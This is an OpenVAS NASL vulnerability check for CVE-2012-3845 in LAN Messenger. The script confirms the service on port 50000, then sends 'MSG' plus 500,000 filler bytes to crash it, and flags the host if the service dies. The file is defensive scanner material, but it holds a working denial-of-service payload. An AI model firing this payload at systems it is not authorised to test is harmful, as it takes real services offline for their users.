###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_lan_messenger_init_req_dos_vuln.nasl 4690 2016-12-06 14:44:58Z cfi $
#
# LAN Messenger Malformed Initiation Request Remote Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802627");
  script_version("$Revision: 4690 $");
  script_bugtraq_id(53333);
  script_cve_id("CVE-2012-3845");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-12-06 15:44:58 +0100 (Tue, 06 Dec 2016) $");
  script_tag(name:"creation_date", value:"2012-05-03 12:12:12 +0530 (Thu, 03 May 2012)");
  script_name("LAN Messenger Malformed Initiation Request Remote Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(50000);

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/75319");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18816");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/522545");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/112389/VL-537.txt");
  script_xref(name:"URL", value:"http://www.vulnerability-lab.com/get_content.php?id=537");

  tag_impact = "Successful exploitation may allow remote attackers to cause the
  application to crash, creating a denial of service condition.

  Impact Level: Application";

  tag_affected = "LAN Messenger versions 1.2.28 and prior";

  tag_insight = "The flaw is triggered when processing a malformed initiation
  request and can be exploited to cause a denial of service via a specially crafted
  packet.";

  tag_solution = "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.";

  tag_summary = "The host is running LAN Messenger and is prone to denial of service
  vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


## Variable Initialization
soc = 0;
soc1 = 0;
port = 0;
req = "";
res = "";

## LAN Messenger Port
port = 50000;
if(!get_port_state(port)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc) {
  exit(0);
}

## Confirm the application before trying exploit
send(socket:soc, data:"MSG");
res = recv(socket:soc, length:1024);

## Check PUBKEY in the response
if("PUBKEY" >!< res){
  exit(0);
  close(soc);
}

## Construct Attack Request
req = "MSG" + crap(500000);
send(socket:soc, data:req);
close(soc);

sleep(2);

## Open the socket and Check Messenger is dead or alive
soc1 = open_sock_tcp(port);
if(!soc1)
{
  security_message(port);
  exit(0);
}
close(soc1);
